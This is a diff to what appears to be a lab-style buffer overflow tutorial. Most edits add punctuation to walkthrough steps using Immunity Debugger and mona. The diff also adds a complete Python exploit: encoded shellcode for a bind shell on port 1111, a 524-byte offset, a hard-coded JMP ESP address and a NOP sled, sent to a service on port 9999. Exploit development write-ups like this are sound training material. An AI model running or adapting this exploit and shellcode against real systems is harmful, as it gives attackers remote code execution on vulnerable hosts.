@@ -151,7 +151,7 @@ Check Immunity and right click on the ESP register and "Follow In Dump".
 
 ![follow in dump](/assets/images/BOF/follow-in-dump.PNG)
 
-Check the Stack window and copy from 01 to FF
+Check the Stack window and copy from 01 to FF.
 
 ![copy badchars](/assets/images/BOF/copy-badchars.PNG)
 
@@ -161,7 +161,7 @@ Paste the badchars into a notepad document and manually evaluate the document fo
 
 It looks like there are no bad characters except for \x00 which is always bad. This means we can use any character in our shellcode. If bad characters had been found then we would have to make sure not to include them in our shellcode.
 
-You can remove the "badchars" variable from the script and reset the "buffer" to just equal A+B
+You can remove the "badchars" variable from the script and reset the "buffer" to just equal A+B.
 
 ![reset script](/assets/images/BOF/script-reset.PNG)
 
@@ -171,11 +171,11 @@ Reset Immunity Debugger and type `!mona jmp -r esp` into the command window at t
 
 ![mona command](/assets/images/BOF/mona-command.PNG)
 
-Once executed, go to the "Window" and choose "2 Log Data"
+Once executed, go to the "Window" and choose "2 Log Data".
 
 ![log data](/assets/images/BOF/window-log-data.PNG)
 
-See that mona has found us a JMP that's not using DEP or ASLR
+See that mona has found us a JMP that's not using DEP or ASLR.
 
 ![JMP ESP](/assets/images/BOF/JMP.PNG)
 
@@ -183,7 +183,7 @@ The JMP we will be using is `311712F3`. We will need to convert this into little
 
 ![JMP in Python](/assets/images/BOF/JMP-in-python.PNG)
 
-Change the "buffer" variable to equal "A+JMP+NOP"
+Change the "buffer" variable to equal "A+JMP+NOP".
 
 ![Buffer](/assets/images/BOF/buffer-A-JMP-NOP.PNG)
 
@@ -207,6 +207,66 @@ Reset Immunity Debugger and send the script.
 
 ![send script](/assets/images/BOF/send-skel-1.PNG)
 
-Finally, connect to your bind shell on port 1111
+Finally, connect to your bind shell on port 1111.
 
 ![bind shell](/assets/images/BOF/connect-to-bind-shell.PNG)
+
+# Final exploit code 
+
+Our final exploit code looks like this.
+
+```
+#!/usr/bin/env python
+
+import socket,sys
+
+buf =  b""
+buf += b"\xda\xdc\xbe\x5f\xa5\x42\x34\xd9\x74\x24\xf4\x5f\x31"
+buf += b"\xc9\xb1\x53\x31\x77\x17\x03\x77\x17\x83\xb0\x59\xa0"
+buf += b"\xc1\xb2\x4a\xa7\x2a\x4a\x8b\xc8\xa3\xaf\xba\xc8\xd0"
+buf += b"\xa4\xed\xf8\x93\xe8\x01\x72\xf1\x18\x91\xf6\xde\x2f"
+buf += b"\x12\xbc\x38\x1e\xa3\xed\x79\x01\x27\xec\xad\xe1\x16"
+buf += b"\x3f\xa0\xe0\x5f\x22\x49\xb0\x08\x28\xfc\x24\x3c\x64"
+buf += b"\x3d\xcf\x0e\x68\x45\x2c\xc6\x8b\x64\xe3\x5c\xd2\xa6"
+buf += b"\x02\xb0\x6e\xef\x1c\xd5\x4b\xb9\x97\x2d\x27\x38\x71"
+buf += b"\x7c\xc8\x97\xbc\xb0\x3b\xe9\xf9\x77\xa4\x9c\xf3\x8b"
+buf += b"\x59\xa7\xc0\xf6\x85\x22\xd2\x51\x4d\x94\x3e\x63\x82"
+buf += b"\x43\xb5\x6f\x6f\x07\x91\x73\x6e\xc4\xaa\x88\xfb\xeb"
+buf += b"\x7c\x19\xbf\xcf\x58\x41\x1b\x71\xf9\x2f\xca\x8e\x19"
+buf += b"\x90\xb3\x2a\x52\x3d\xa7\x46\x39\x2a\x04\x6b\xc1\xaa"
+buf += b"\x02\xfc\xb2\x98\x8d\x56\x5c\x91\x46\x71\x9b\xd6\x7c"
+buf += b"\xc5\x33\x29\x7f\x36\x1a\xee\x2b\x66\x34\xc7\x53\xed"
+buf += b"\xc4\xe8\x81\x98\xcc\x4f\x7a\xbf\x31\x2f\x2a\x7f\x99"
+buf += b"\xd8\x20\x70\xc6\xf9\x4a\x5a\x6f\x91\xb6\x65\x8b\x35"
+buf += b"\x3e\x83\xf9\xa9\x16\x1b\x95\x0b\x4d\x94\x02\x73\xa7"
+buf += b"\x8c\xa4\x3c\xa1\x0b\xcb\xbc\xe7\x3b\x5b\x37\xe4\xff"
+buf += b"\x7a\x48\x21\xa8\xeb\xdf\xbf\x39\x5e\x41\xbf\x13\x08"
+buf += b"\xe2\x52\xf8\xc8\x6d\x4f\x57\x9f\x3a\xa1\xae\x75\xd7"
+buf += b"\x98\x18\x6b\x2a\x7c\x62\x2f\xf1\xbd\x6d\xae\x74\xf9"
+buf += b"\x49\xa0\x40\x02\xd6\x94\x1c\x55\x80\x42\xdb\x0f\x62"
+buf += b"\x3c\xb5\xfc\x2c\xa8\x40\xcf\xee\xae\x4c\x1a\x99\x4e"
+buf += b"\xfc\xf3\xdc\x71\x31\x94\xe8\x0a\x2f\x04\x16\xc1\xeb"
+buf += b"\x24\xf5\xc3\x01\xcd\xa0\x86\xab\x90\x52\x7d\xef\xac"
+buf += b"\xd0\x77\x90\x4a\xc8\xf2\x95\x17\x4e\xef\xe7\x08\x3b"
+buf += b"\x0f\x5b\x28\x6e"
+
+address = '192.168.0.12'
+port = 9999
+A = "A" * 524
+B = "B" * 4
+JMP = "\xF3\x12\x17\x31"
+NOP = "\x90"*20
+
+buffer = A+JMP+NOP+buf
+
+try:
+	print '[+] Sending buffer'
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((address,port))
+	s.send(buffer)
+except:
+ 	print '[!] Unable to connect to the application.'
+ 	sys.exit(0)
+finally:
+	s.close()
+```
